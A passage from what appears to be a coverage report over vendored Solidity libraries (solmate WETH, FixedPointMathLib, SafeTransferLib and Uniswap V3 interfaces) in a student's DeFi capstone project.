 163 |     |         return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();
 164 |     |     }
 165 |     | 
 166 |     |     function computeDomainSeparator() internal view virtual returns (bytes32) {
 167 |     |         return
 168 |     |             keccak256(
 169 |     |                 abi.encode(
 170 |     |                     keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
 171 |     |                     keccak256(bytes(name)),
 172 |     |                     keccak256("1"),
 173 |     |                     block.chainid,
 174 |     |                     address(this)
 175 |     |                 )
 176 |     |             );
 177 |     |     }
 178 |     | 
 179 |     |     /*//////////////////////////////////////////////////////////////
 180 |     |                         INTERNAL MINT/BURN LOGIC
 181 |     |     //////////////////////////////////////////////////////////////*/
 182 |     | 
 183 |     |     function _mint(address to, uint256 amount) internal virtual {
 184 |     |         totalSupply += amount;
 185 |     | 
 186 |     |         // Cannot overflow because the sum of all user
 187 |     |         // balances can't exceed the max uint256 value.
 188 |     |         unchecked {
 189 |     |             balanceOf[to] += amount;
 190 |     |         }
 191 |     | 
 192 |     |         emit Transfer(address(0), to, amount);
 193 |     |     }
 194 |     | 
 195 |     |     function _burn(address from, uint256 amount) internal virtual {
 196 |     |         balanceOf[from] -= amount;
 197 |     | 
 198 |     |         // Cannot underflow because a user's balance
 199 |     |         // will never be larger than the total supply.
 200 |     |         unchecked {
 201 |     |             totalSupply -= amount;
 202 |     |         }
 203 |     | 
 204 |     |         emit Transfer(from, address(0), amount);
 205 |     |     }
 206 |     | }
 207 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/solmate/src/tokens/WETH.sol
  1 |     | // SPDX-License-Identifier: AGPL-3.0-only
  2 |     | pragma solidity >=0.8.0;
  3 |     | 
  4 |     | import {ERC20} from "./ERC20.sol";
  5 |     | 
  6 |     | import {SafeTransferLib} from "../utils/SafeTransferLib.sol";
  7 |     | 
  8 |     | /// @notice Minimalist and modern Wrapped Ether implementation.
  9 |     | /// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/WETH.sol)
 10 |     | /// @author Inspired by WETH9 (https://github.com/dapphub/ds-weth/blob/master/src/weth9.sol)
 11 |     | contract WETH is ERC20("Wrapped Ether", "WETH", 18) {
 12 |     |     using SafeTransferLib for address;
 13 |     | 
 14 |     |     event Deposit(address indexed from, uint256 amount);
 15 |     | 
 16 |     |     event Withdrawal(address indexed to, uint256 amount);
 17 |     | 
 18 |     |     function deposit() public payable virtual {
 19 |     |         _mint(msg.sender, msg.value);
 20 |     | 
 21 |     |         emit Deposit(msg.sender, msg.value);
 22 |     |     }
 23 |     | 
 24 |     |     function withdraw(uint256 amount) public virtual {
 25 |     |         _burn(msg.sender, amount);
 26 |     | 
 27 |     |         emit Withdrawal(msg.sender, amount);
 28 |     | 
 29 |     |         msg.sender.safeTransferETH(amount);
 30 |     |     }
 31 |     | 
 32 |     |     receive() external payable virtual {
 33 |     |         deposit();
 34 |     |     }
 35 |     | }
 36 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/solmate/src/utils/FixedPointMathLib.sol
   1 |     | // SPDX-License-Identifier: AGPL-3.0-only
   2 |     | pragma solidity >=0.8.0;
   3 |     | 
   4 |     | /// @notice Arithmetic library with operations for fixed-point numbers.
   5 |     | /// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/FixedPointMathLib.sol)
   6 |     | /// @author Inspired by USM (https://github.com/usmfum/USM/blob/master/contracts/WadMath.sol)
   7 |     | library FixedPointMathLib {
   8 |     |     /*//////////////////////////////////////////////////////////////
   9 |     |                     SIMPLIFIED FIXED POINT OPERATIONS
  10 |     |     //////////////////////////////////////////////////////////////*/
  11 |     | 
  12 |     |     uint256 internal constant MAX_UINT256 = 2**256 - 1;
  13 |     | 
  14 |     |     uint256 internal constant WAD = 1e18; // The scalar of ETH and most ERC20s.
  15 |     | 
  16 |     |     function mulWadDown(uint256 x, uint256 y) internal pure returns (uint256) {
  17 |     |         return mulDivDown(x, y, WAD); // Equivalent to (x * y) / WAD rounded down.
  18 |     |     }
  19 |     | 
  20 |     |     function mulWadUp(uint256 x, uint256 y) internal pure returns (uint256) {
  21 |     |         return mulDivUp(x, y, WAD); // Equivalent to (x * y) / WAD rounded up.
  22 |     |     }
  23 |     | 
  24 |     |     function divWadDown(uint256 x, uint256 y) internal pure returns (uint256) {
  25 |     |         return mulDivDown(x, WAD, y); // Equivalent to (x * WAD) / y rounded down.
  26 |     |     }
  27 |     | 
  28 |     |     function divWadUp(uint256 x, uint256 y) internal pure returns (uint256) {
  29 |     |         return mulDivUp(x, WAD, y); // Equivalent to (x * WAD) / y rounded up.
  30 |     |     }
  31 |     | 
  32 |     |     /*//////////////////////////////////////////////////////////////
  33 |     |                     LOW LEVEL FIXED POINT OPERATIONS
  34 |     |     //////////////////////////////////////////////////////////////*/
  35 |     | 
  36 |     |     function mulDivDown(
  37 |     |         uint256 x,
  38 |     |         uint256 y,
  39 |     |         uint256 denominator
  40 |     |     ) internal pure returns (uint256 z) {
  41 |     |         /// @solidity memory-safe-assembly
  42 |     |         assembly {
  43 |     |             // Equivalent to require(denominator != 0 && (y == 0 || x <= type(uint256).max / y))
  44 |     |             if iszero(mul(denominator, iszero(mul(y, gt(x, div(MAX_UINT256, y)))))) {
  45 |     |                 revert(0, 0)
  46 |     |             }
  47 |     | 
  48 |     |             // Divide x * y by the denominator.
  49 |     |             z := div(mul(x, y), denominator)
  50 |     |         }
  51 |     |     }
  52 |     | 
  53 |     |     function mulDivUp(
  54 |     |         uint256 x,
  55 |     |         uint256 y,
  56 |     |         uint256 denominator
  57 |     |     ) internal pure returns (uint256 z) {
  58 |     |         /// @solidity memory-safe-assembly
  59 |     |         assembly {
  60 |     |             // Equivalent to require(denominator != 0 && (y == 0 || x <= type(uint256).max / y))
  61 |     |             if iszero(mul(denominator, iszero(mul(y, gt(x, div(MAX_UINT256, y)))))) {
  62 |     |                 revert(0, 0)
  63 |     |             }
  64 |     | 
  65 |     |             // If x * y modulo the denominator is strictly greater than 0,
  66 |     |             // 1 is added to round up the division of x * y by the denominator.
  67 |     |             z := add(gt(mod(mul(x, y), denominator), 0), div(mul(x, y), denominator))
  68 |     |         }
  69 |     |     }
  70 |     | 
  71 |     |     function rpow(
  72 |     |         uint256 x,
  73 |     |         uint256 n,
  74 |     |         uint256 scalar
  75 |     |     ) internal pure returns (uint256 z) {
  76 |     |         /// @solidity memory-safe-assembly
  77 |     |         assembly {
  78 |     |             switch x
  79 |     |             case 0 {
  80 |     |                 switch n
  81 |     |                 case 0 {
  82 |     |                     // 0 ** 0 = 1
  83 |     |                     z := scalar
  84 |     |                 }
  85 |     |                 default {
  86 |     |                     // 0 ** n = 0
  87 |     |                     z := 0
  88 |     |                 }
  89 |     |             }
  90 |     |             default {
  91 |     |                 switch mod(n, 2)
  92 |     |                 case 0 {
  93 |     |                     // If n is even, store scalar in z for now.
  94 |     |                     z := scalar
  95 |     |                 }
  96 |     |                 default {
  97 |     |                     // If n is odd, store x in z for now.
  98 |     |                     z := x
  99 |     |                 }
 100 |     | 
 101 |     |                 // Shifting right by 1 is like dividing by 2.
 102 |     |                 let half := shr(1, scalar)
 103 |     | 
 104 |     |                 for {
 105 |     |                     // Shift n right by 1 before looping to halve it.
 106 |     |                     n := shr(1, n)
 107 |     |                 } n {
 108 |     |                     // Shift n right by 1 each iteration to halve it.
 109 |     |                     n := shr(1, n)
 110 |     |                 } {
 111 |     |                     // Revert immediately if x ** 2 would overflow.
 112 |     |                     // Equivalent to iszero(eq(div(xx, x), x)) here.
 113 |     |                     if shr(128, x) {
 114 |     |                         revert(0, 0)
 115 |     |                     }
 116 |     | 
 117 |     |                     // Store x squared.
 118 |     |                     let xx := mul(x, x)
 119 |     | 
 120 |     |                     // Round to the nearest number.
 121 |     |                     let xxRound := add(xx, half)
 122 |     | 
 123 |     |                     // Revert if xx + half overflowed.
 124 |     |                     if lt(xxRound, xx) {
 125 |     |                         revert(0, 0)
 126 |     |                     }
 127 |     | 
 128 |     |                     // Set x to scaled xxRound.
 129 |     |                     x := div(xxRound, scalar)
 130 |     | 
 131 |     |                     // If n is even:
 132 |     |                     if mod(n, 2) {
 133 |     |                         // Compute z * x.
 134 |     |                         let zx := mul(z, x)
 135 |     | 
 136 |     |                         // If z * x overflowed:
 137 |     |                         if iszero(eq(div(zx, x), z)) {
 138 |     |                             // Revert if x is non-zero.
 139 |     |                             if iszero(iszero(x)) {
 140 |     |                                 revert(0, 0)
 141 |     |                             }
 142 |     |                         }
 143 |     | 
 144 |     |                         // Round to the nearest number.
 145 |     |                         let zxRound := add(zx, half)
 146 |     | 
 147 |     |                         // Revert if zx + half overflowed.
 148 |     |                         if lt(zxRound, zx) {
 149 |     |                             revert(0, 0)
 150 |     |                         }
 151 |     | 
 152 |     |                         // Return properly scaled zxRound.
 153 |     |                         z := div(zxRound, scalar)
 154 |     |                     }
 155 |     |                 }
 156 |     |             }
 157 |     |         }
 158 |     |     }
 159 |     | 
 160 |     |     /*//////////////////////////////////////////////////////////////
 161 |     |                         GENERAL NUMBER UTILITIES
 162 |     |     //////////////////////////////////////////////////////////////*/
 163 |     | 
 164 | *   |     function sqrt(uint256 x) internal pure returns (uint256 z) {
 165 |     |         /// @solidity memory-safe-assembly
 166 | *   |         assembly {
 167 | *   |             let y := x // We start y at x, which will help us make our initial estimate.
 168 |     | 
 169 | *   |             z := 181 // The "correct" value is 1, but this saves a multiplication later.
 170 |     | 
 171 |     |             // This segment is to get a reasonable initial estimate for the Babylonian method. With a bad
 172 |     |             // start, the correct # of bits increases ~linearly each iteration instead of ~quadratically.
 173 |     | 
 174 |     |             // We check y >= 2^(k + 8) but shift right by k bits
 175 |     |             // each branch to ensure that if x >= 256, then y >= 256.
 176 | *   |             if iszero(lt(y, 0x10000000000000000000000000000000000)) {
 177 | *   |                 y := shr(128, y)
 178 | *   |                 z := shl(64, z)
 179 |     |             }
 180 | *   |             if iszero(lt(y, 0x1000000000000000000)) {
 181 |     |                 y := shr(64, y)
 182 |     |                 z := shl(32, z)
 183 |     |             }
 184 | *   |             if iszero(lt(y, 0x10000000000)) {
 185 | *   |                 y := shr(32, y)
 186 | *   |                 z := shl(16, z)
 187 |     |             }
 188 | *   |             if iszero(lt(y, 0x1000000)) {
 189 | *   |                 y := shr(16, y)
 190 | *   |                 z := shl(8, z)
 191 |     |             }
 192 |     | 
 193 |     |             // Goal was to get z*z*y within a small factor of x. More iterations could
 194 |     |             // get y in a tighter range. Currently, we will have y in [256, 256*2^16).
 195 |     |             // We ensured y >= 256 so that the relative difference between y and y+1 is small.
 196 |     |             // That's not possible if x < 256 but we can just verify those cases exhaustively.
 197 |     | 
 198 |     |             // Now, z*z*y <= x < z*z*(y+1), and y <= 2^(16+8), and either y >= 256, or x < 256.
 199 |     |             // Correctness can be checked exhaustively for x < 256, so we assume y >= 256.
 200 |     |             // Then z*sqrt(y) is within sqrt(257)/sqrt(256) of sqrt(x), or about 20bps.
 201 |     | 
 202 |     |             // For s in the range [1/256, 256], the estimate f(s) = (181/1024) * (s+1) is in the range
 203 |     |             // (1/2.84 * sqrt(s), 2.84 * sqrt(s)), with largest error when s = 1 and when s = 256 or 1/256.
 204 |     | 
 205 |     |             // Since y is in [256, 256*2^16), let a = y/65536, so that a is in [1/256, 256). Then we can estimate
 206 |     |             // sqrt(y) using sqrt(65536) * 181/1024 * (a + 1) = 181/4 * (y + 65536)/65536 = 181 * (y + 65536)/2^18.
 207 |     | 
 208 |     |             // There is no overflow risk here since y < 2^136 after the first branch above.
 209 | *   |             z := shr(18, mul(z, add(y, 65536))) // A mul() is saved from starting z at 181.
 210 |     | 
 211 |     |             // Given the worst case multiplicative error of 2.84 above, 7 iterations should be enough.
 212 | *   |             z := shr(1, add(z, div(x, z)))
 213 | *   |             z := shr(1, add(z, div(x, z)))
 214 | *   |             z := shr(1, add(z, div(x, z)))
 215 | *   |             z := shr(1, add(z, div(x, z)))
 216 | *   |             z := shr(1, add(z, div(x, z)))
 217 | *   |             z := shr(1, add(z, div(x, z)))
 218 | *   |             z := shr(1, add(z, div(x, z)))
 219 |     | 
 220 |     |             // If x+1 is a perfect square, the Babylonian method cycles between
 221 |     |             // floor(sqrt(x)) and ceil(sqrt(x)). This statement ensures we return floor.
 222 |     |             // See: https://en.wikipedia.org/wiki/Integer_square_root#Using_only_integer_division
 223 |     |             // Since the ceil is rare, we save gas on the assignment and repeat division in the rare case.
 224 |     |             // If you don't care whether the floor or ceil square root is returned, you can remove this statement.
 225 | *   |             z := sub(z, lt(div(x, z), z))
 226 |     |         }
 227 |     |     }
 228 |     | 
 229 |     |     function unsafeMod(uint256 x, uint256 y) internal pure returns (uint256 z) {
 230 |     |         /// @solidity memory-safe-assembly
 231 |     |         assembly {
 232 |     |             // Mod x by y. Note this will return
 233 |     |             // 0 instead of reverting if y is zero.
 234 |     |             z := mod(x, y)
 235 |     |         }
 236 |     |     }
 237 |     | 
 238 |     |     function unsafeDiv(uint256 x, uint256 y) internal pure returns (uint256 r) {
 239 |     |         /// @solidity memory-safe-assembly
 240 |     |         assembly {
 241 |     |             // Divide x by y. Note this will return
 242 |     |             // 0 instead of reverting if y is zero.
 243 |     |             r := div(x, y)
 244 |     |         }
 245 |     |     }
 246 |     | 
 247 |     |     function unsafeDivUp(uint256 x, uint256 y) internal pure returns (uint256 z) {
 248 |     |         /// @solidity memory-safe-assembly
 249 |     |         assembly {
 250 |     |             // Add 1 to x * y if x % y > 0. Note this will
 251 |     |             // return 0 instead of reverting if y is zero.
 252 |     |             z := add(gt(mod(x, y), 0), div(x, y))
 253 |     |         }
 254 |     |     }
 255 |     | }
 256 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/solmate/src/utils/SafeTransferLib.sol
   1 |     | // SPDX-License-Identifier: AGPL-3.0-only
   2 |     | pragma solidity >=0.8.0;
   3 |     | 
   4 |     | import {ERC20} from "../tokens/ERC20.sol";
   5 |     | 
   6 |     | /// @notice Safe ETH and ERC20 transfer library that gracefully handles missing return values.
   7 |     | /// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol)
   8 |     | /// @dev Use with caution! Some functions in this library knowingly create dirty bits at the destination of the free memory pointer.
   9 |     | library SafeTransferLib {
  10 |     |     /*//////////////////////////////////////////////////////////////
  11 |     |                              ETH OPERATIONS
  12 |     |     //////////////////////////////////////////////////////////////*/
  13 |     | 
  14 |     |     function safeTransferETH(address to, uint256 amount) internal {
  15 |     |         bool success;
  16 |     | 
  17 |     |         /// @solidity memory-safe-assembly
  18 |     |         assembly {
  19 |     |             // Transfer the ETH and store if it succeeded or not.
  20 |     |             success := call(gas(), to, amount, 0, 0, 0, 0)
  21 |     |         }
  22 |     | 
  23 |     |         require(success, "ETH_TRANSFER_FAILED");
  24 |     |     }
  25 |     | 
  26 |     |     /*//////////////////////////////////////////////////////////////
  27 |     |                             ERC20 OPERATIONS
  28 |     |     //////////////////////////////////////////////////////////////*/
  29 |     | 
  30 |     |     function safeTransferFrom(
  31 |     |         ERC20 token,
  32 |     |         address from,
  33 |     |         address to,
  34 |     |         uint256 amount
  35 |     |     ) internal {
  36 |     |         bool success;
  37 |     | 
  38 |     |         /// @solidity memory-safe-assembly
  39 |     |         assembly {
  40 |     |             // Get a pointer to some free memory.
  41 |     |             let freeMemoryPointer := mload(0x40)
  42 |     | 
  43 |     |             // Write the abi-encoded calldata into memory, beginning with the function selector.
  44 |     |             mstore(freeMemoryPointer, 0x23b872dd00000000000000000000000000000000000000000000000000000000)
  45 |     |             mstore(add(freeMemoryPointer, 4), and(from, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "from" argument.
  46 |     |             mstore(add(freeMemoryPointer, 36), and(to, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "to" argument.
  47 |     |             mstore(add(freeMemoryPointer, 68), amount) // Append the "amount" argument. Masking not required as it's a full 32 byte type.
  48 |     | 
  49 |     |             // We use 100 because the length of our calldata totals up like so: 4 + 32 * 3.
  50 |     |             // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.
  51 |     |             success := call(gas(), token, 0, freeMemoryPointer, 100, 0, 32)
  52 |     | 
  53 |     |             // Set success to whether the call reverted, if not we check it either
  54 |     |             // returned exactly 1 (can't just be non-zero data), or had no return data and token has code.
  55 |     |             if and(iszero(and(eq(mload(0), 1), gt(returndatasize(), 31))), success) {
  56 |     |                 success := iszero(or(iszero(extcodesize(token)), returndatasize())) 
  57 |     |             }
  58 |     |         }
  59 |     | 
  60 |     |         require(success, "TRANSFER_FROM_FAILED");
  61 |     |     }
  62 |     | 
  63 |     |     function safeTransfer(
  64 |     |         ERC20 token,
  65 |     |         address to,
  66 |     |         uint256 amount
  67 |     |     ) internal {
  68 |     |         bool success;
  69 |     | 
  70 |     |         /// @solidity memory-safe-assembly
  71 |     |         assembly {
  72 |     |             // Get a pointer to some free memory.
  73 |     |             let freeMemoryPointer := mload(0x40)
  74 |     | 
  75 |     |             // Write the abi-encoded calldata into memory, beginning with the function selector.
  76 |     |             mstore(freeMemoryPointer, 0xa9059cbb00000000000000000000000000000000000000000000000000000000)
  77 |     |             mstore(add(freeMemoryPointer, 4), and(to, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "to" argument.
  78 |     |             mstore(add(freeMemoryPointer, 36), amount) // Append the "amount" argument. Masking not required as it's a full 32 byte type.
  79 |     | 
  80 |     |             // We use 68 because the length of our calldata totals up like so: 4 + 32 * 2.
  81 |     |             // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.
  82 |     |             success := call(gas(), token, 0, freeMemoryPointer, 68, 0, 32)
  83 |     | 
  84 |     |             // Set success to whether the call reverted, if not we check it either
  85 |     |             // returned exactly 1 (can't just be non-zero data), or had no return data and token has code.
  86 |     |             if and(iszero(and(eq(mload(0), 1), gt(returndatasize(), 31))), success) {
  87 |     |                 success := iszero(or(iszero(extcodesize(token)), returndatasize())) 
  88 |     |             }
  89 |     |         }
  90 |     | 
  91 |     |         require(success, "TRANSFER_FAILED");
  92 |     |     }
  93 |     | 
  94 |     |     function safeApprove(
  95 |     |         ERC20 token,
  96 |     |         address to,
  97 |     |         uint256 amount
  98 |     |     ) internal {
  99 |     |         bool success;
 100 |     | 
 101 |     |         /// @solidity memory-safe-assembly
 102 |     |         assembly {
 103 |     |             // Get a pointer to some free memory.
 104 |     |             let freeMemoryPointer := mload(0x40)
 105 |     | 
 106 |     |             // Write the abi-encoded calldata into memory, beginning with the function selector.
 107 |     |             mstore(freeMemoryPointer, 0x095ea7b300000000000000000000000000000000000000000000000000000000)
 108 |     |             mstore(add(freeMemoryPointer, 4), and(to, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "to" argument.
 109 |     |             mstore(add(freeMemoryPointer, 36), amount) // Append the "amount" argument. Masking not required as it's a full 32 byte type.
 110 |     | 
 111 |     |             // We use 68 because the length of our calldata totals up like so: 4 + 32 * 2.
 112 |     |             // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.
 113 |     |             success := call(gas(), token, 0, freeMemoryPointer, 68, 0, 32)
 114 |     | 
 115 |     |             // Set success to whether the call reverted, if not we check it either
 116 |     |             // returned exactly 1 (can't just be non-zero data), or had no return data and token has code.
 117 |     |             if and(iszero(and(eq(mload(0), 1), gt(returndatasize(), 31))), success) {
 118 |     |                 success := iszero(or(iszero(extcodesize(token)), returndatasize())) 
 119 |     |             }
 120 |     |         }
 121 |     | 
 122 |     |         require(success, "APPROVE_FAILED");
 123 |     |     }
 124 |     | }
 125 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/interfaces/IERC20Minimal.sol
  1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
  2 |     | pragma solidity >=0.5.0;
  3 |     | 
  4 |     | /// @title Minimal ERC20 interface for Uniswap
  5 |     | /// @notice Contains a subset of the full ERC20 interface that is used in Uniswap V3
  6 |     | interface IERC20Minimal {
  7 |     |     /// @notice Returns the balance of a token
  8 |     |     /// @param account The account for which to look up the number of tokens it has, i.e. its balance
  9 |     |     /// @return The number of tokens held by the account
 10 |     |     function balanceOf(address account) external view returns (uint256);
 11 |     | 
 12 |     |     /// @notice Transfers the amount of token from the `msg.sender` to the recipient
 13 |     |     /// @param recipient The account that will receive the amount transferred
 14 |     |     /// @param amount The number of tokens to send from the sender to the recipient
 15 |     |     /// @return Returns true for a successful transfer, false for an unsuccessful transfer
 16 |     |     function transfer(address recipient, uint256 amount) external returns (bool);
 17 |     | 
 18 |     |     /// @notice Returns the current allowance given to a spender by an owner
 19 |     |     /// @param owner The account of the token owner
 20 |     |     /// @param spender The account of the token spender
 21 |     |     /// @return The current allowance granted by `owner` to `spender`
 22 |     |     function allowance(address owner, address spender) external view returns (uint256);
 23 |     | 
 24 |     |     /// @notice Sets the allowance of a spender from the `msg.sender` to the value `amount`
 25 |     |     /// @param spender The account which will be allowed to spend a given amount of the owners tokens
 26 |     |     /// @param amount The amount of tokens allowed to be used by `spender`
 27 |     |     /// @return Returns true for a successful approval, false for unsuccessful
 28 |     |     function approve(address spender, uint256 amount) external returns (bool);
 29 |     | 
 30 |     |     /// @notice Transfers `amount` tokens from `sender` to `recipient` up to the allowance given to the `msg.sender`
 31 |     |     /// @param sender The account from which the transfer will be initiated
 32 |     |     /// @param recipient The recipient of the transfer
 33 |     |     /// @param amount The amount of the transfer
 34 |     |     /// @return Returns true for a successful transfer, false for unsuccessful
 35 |     |     function transferFrom(
 36 |     |         address sender,
 37 |     |         address recipient,
 38 |     |         uint256 amount
 39 |     |     ) external returns (bool);
 40 |     | 
 41 |     |     /// @notice Event emitted when tokens are transferred from one address to another, either via `#transfer` or `#transferFrom`.
 42 |     |     /// @param from The account from which the tokens were sent, i.e. the balance decreased
 43 |     |     /// @param to The account to which the tokens were sent, i.e. the balance increased
 44 |     |     /// @param value The amount of tokens that were transferred
 45 |     |     event Transfer(address indexed from, address indexed to, uint256 value);
 46 |     | 
 47 |     |     /// @notice Event emitted when the approval amount for the spender of a given owner's tokens changes.
 48 |     |     /// @param owner The account that approved spending of its tokens
 49 |     |     /// @param spender The account for which the spending allowance was modified
 50 |     |     /// @param value The new allowance from the owner to the spender
 51 |     |     event Approval(address indexed owner, address indexed spender, uint256 value);
 52 |     | }
 53 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/interfaces/IUniswapV3Factory.sol
  1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
  2 |     | pragma solidity >=0.5.0;
  3 |     | 
  4 |     | /// @title The interface for the Uniswap V3 Factory
  5 |     | /// @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees
  6 |     | interface IUniswapV3Factory {
  7 |     |     /// @notice Emitted when the owner of the factory is changed
  8 |     |     /// @param oldOwner The owner before the owner was changed
  9 |     |     /// @param newOwner The owner after the owner was changed
 10 |     |     event OwnerChanged(address indexed oldOwner, address indexed newOwner);
 11 |     | 
 12 |     |     /// @notice Emitted when a pool is created
 13 |     |     /// @param token0 The first token of the pool by address sort order
 14 |     |     /// @param token1 The second token of the pool by address sort order
 15 |     |     /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip
 16 |     |     /// @param tickSpacing The minimum number of ticks between initialized ticks
 17 |     |     /// @param pool The address of the created pool
 18 |     |     event PoolCreated(
 19 |     |         address indexed token0,
 20 |     |         address indexed token1,
 21 |     |         uint24 indexed fee,
 22 |     |         int24 tickSpacing,
 23 |     |         address pool
 24 |     |     );
 25 |     | 
 26 |     |     /// @notice Emitted when a new fee amount is enabled for pool creation via the factory
 27 |     |     /// @param fee The enabled fee, denominated in hundredths of a bip
 28 |     |     /// @param tickSpacing The minimum number of ticks between initialized ticks for pools created with the given fee
 29 |     |     event FeeAmountEnabled(uint24 indexed fee, int24 indexed tickSpacing);
 30 |     | 
 31 |     |     /// @notice Returns the current owner of the factory
 32 |     |     /// @dev Can be changed by the current owner via setOwner
 33 |     |     /// @return The address of the factory owner
 34 |     |     function owner() external view returns (address);
 35 |     | 
 36 |     |     /// @notice Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled
 37 |     |     /// @dev A fee amount can never be removed, so this value should be hard coded or cached in the calling context
 38 |     |     /// @param fee The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee
 39 |     |     /// @return The tick spacing
 40 |     |     function feeAmountTickSpacing(uint24 fee) external view returns (int24);
 41 |     | 
 42 |     |     /// @notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist
 43 |     |     /// @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order
 44 |     |     /// @param tokenA The contract address of either token0 or token1
 45 |     |     /// @param tokenB The contract address of the other token
 46 |     |     /// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip
 47 |     |     /// @return pool The pool address
 48 |     |     function getPool(
 49 |     |         address tokenA,
 50 |     |         address tokenB,
 51 |     |         uint24 fee
 52 |     |     ) external view returns (address pool);
 53 |     | 
 54 |     |     /// @notice Creates a pool for the given two tokens and fee
 55 |     |     /// @param tokenA One of the two tokens in the desired pool
 56 |     |     /// @param tokenB The other of the two tokens in the desired pool
 57 |     |     /// @param fee The desired fee for the pool
 58 |     |     /// @dev tokenA and tokenB may be passed in either order: token0/token1 or token1/token0. tickSpacing is retrieved
 59 |     |     /// from the fee. The call will revert if the pool already exists, the fee is invalid, or the token arguments
 60 |     |     /// are invalid.
 61 |     |     /// @return pool The address of the newly created pool
 62 |     |     function createPool(
 63 |     |         address tokenA,
 64 |     |         address tokenB,
 65 |     |         uint24 fee
 66 |     |     ) external returns (address pool);
 67 |     | 
 68 |     |     /// @notice Updates the owner of the factory
 69 |     |     /// @dev Must be called by the current owner
 70 |     |     /// @param _owner The new owner of the factory
 71 |     |     function setOwner(address _owner) external;
 72 |     | 
 73 |     |     /// @notice Enables a fee amount with the given tickSpacing
 74 |     |     /// @dev Fee amounts may never be removed once enabled
 75 |     |     /// @param fee The fee amount to enable, denominated in hundredths of a bip (i.e. 1e-6)
 76 |     |     /// @param tickSpacing The spacing between ticks to be enforced for all pools created with the given fee amount
 77 |     |     function enableFeeAmount(uint24 fee, int24 tickSpacing) external;
 78 |     | }
 79 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/interfaces/IUniswapV3Pool.sol
  1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
  2 |     | pragma solidity >=0.5.0;
  3 |     | 
  4 |     | import './pool/IUniswapV3PoolImmutables.sol';
  5 |     | import './pool/IUniswapV3PoolState.sol';
  6 |     | import './pool/IUniswapV3PoolDerivedState.sol';
  7 |     | import './pool/IUniswapV3PoolActions.sol';
  8 |     | import './pool/IUniswapV3PoolOwnerActions.sol';
  9 |     | import './pool/IUniswapV3PoolEvents.sol';
 10 |     | 
 11 |     | /// @title The interface for a Uniswap V3 Pool
 12 |     | /// @notice A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform
 13 |     | /// to the ERC20 specification
 14 |     | /// @dev The pool interface is broken up into many smaller pieces
 15 |     | interface IUniswapV3Pool is
 16 |     |     IUniswapV3PoolImmutables,
 17 |     |     IUniswapV3PoolState,
 18 |     |     IUniswapV3PoolDerivedState,
 19 |     |     IUniswapV3PoolActions,
 20 |     |     IUniswapV3PoolOwnerActions,
 21 |     |     IUniswapV3PoolEvents
 22 |     | {
 23 |     | 
 24 |     | }
 25 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol
  1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
  2 |     | pragma solidity >=0.5.0;
  3 |     | 
  4 |     | /// @title Callback for IUniswapV3PoolActions#swap
  5 |     | /// @notice Any contract that calls IUniswapV3PoolActions#swap must implement this interface
  6 |     | interface IUniswapV3SwapCallback {
  7 |     |     /// @notice Called to `msg.sender` after executing a swap via IUniswapV3Pool#swap.
  8 |     |     /// @dev In the implementation you must pay the pool tokens owed for the swap.
  9 |     |     /// The caller of this method must be checked to be a UniswapV3Pool deployed by the canonical UniswapV3Factory.
 10 |     |     /// amount0Delta and amount1Delta can both be 0 if no tokens were swapped.
 11 |     |     /// @param amount0Delta The amount of token0 that was sent (negative) or must be received (positive) by the pool by
 12 |     |     /// the end of the swap. If positive, the callback must send that amount of token0 to the pool.
 13 |     |     /// @param amount1Delta The amount of token1 that was sent (negative) or must be received (positive) by the pool by
 14 |     |     /// the end of the swap. If positive, the callback must send that amount of token1 to the pool.
 15 |     |     /// @param data Any data passed through by the caller via the IUniswapV3PoolActions#swap call
 16 |     |     function uniswapV3SwapCallback(
 17 |     |         int256 amount0Delta,
 18 |     |         int256 amount1Delta,
 19 |     |         bytes calldata data
 20 |     |     ) external;
 21 |     | }
 22 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/interfaces/pool/IUniswapV3PoolActions.sol
   1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
   2 |     | pragma solidity >=0.5.0;
   3 |     | 
   4 |     | /// @title Permissionless pool actions
   5 |     | /// @notice Contains pool methods that can be called by anyone
   6 |     | interface IUniswapV3PoolActions {
   7 |     |     /// @notice Sets the initial price for the pool
   8 |     |     /// @dev Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value
   9 |     |     /// @param sqrtPriceX96 the initial sqrt price of the pool as a Q64.96
  10 |     |     function initialize(uint160 sqrtPriceX96) external;
  11 |     | 
  12 |     |     /// @notice Adds liquidity for the given recipient/tickLower/tickUpper position
